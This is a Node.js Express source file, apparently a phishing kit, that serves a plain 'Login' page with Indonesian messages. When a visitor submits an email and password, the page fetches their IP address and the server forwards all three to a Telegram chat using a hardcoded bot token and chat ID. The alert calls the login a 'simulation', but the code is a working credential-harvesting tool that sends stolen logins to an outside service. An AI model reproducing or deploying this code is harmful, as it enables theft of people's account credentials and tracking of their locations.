const express = require("express");
const axios = require("axios");
const app = express();

const TOKEN = "7628314972:AAHZtVoYDVeujuM8o7xpvaLzTGIjrMJodhY"; 
const CHAT_ID = "6786210993"; 


app.use(express.json());

app.get("/", (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login</title>
        <style>
            body { text-align: center; font-family: Arial, sans-serif; }
            input, button { display: block; margin: 10px auto; padding: 10px; }
        </style>
    </head>
    <body>
        <h2>Login</h2>
        <form id="loginForm">
            <input type="email" id="email" placeholder="Email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        <script>
            document.getElementById("loginForm").addEventListener("submit", async function(event) {
                event.preventDefault();
                let email = document.getElementById("email").value;
                let password = document.getElementById("password").value;

                let ipData = await fetch("https://ipapi.co/json/").then(res => res.json());
                let ip = ipData.ip;

                await fetch("/send-message", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ email, password, ip })
                });

                alert("Login berhasil! (Simulasi)");
            });
        </script>
    </body>
    </html>
    `);
});

app.post("/send-message", async (req, res) => {
    const { email, password, ip } = req.body;

    const message = `🔥 *Login Info* 🔥\n📧 Email: ${email}\n🔑 Password: ${password}\n\n🌍 *Info IP*\n📌 IP: ${ip}`;

    try {
        await axios.post(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: "Markdown"
        });
        res.json({ success: true });
    } catch (error) {
        res.json({ success: false, error: error.message });
    }
});

app.listen(3000, () => console.log("Server jalan di port 3000"));
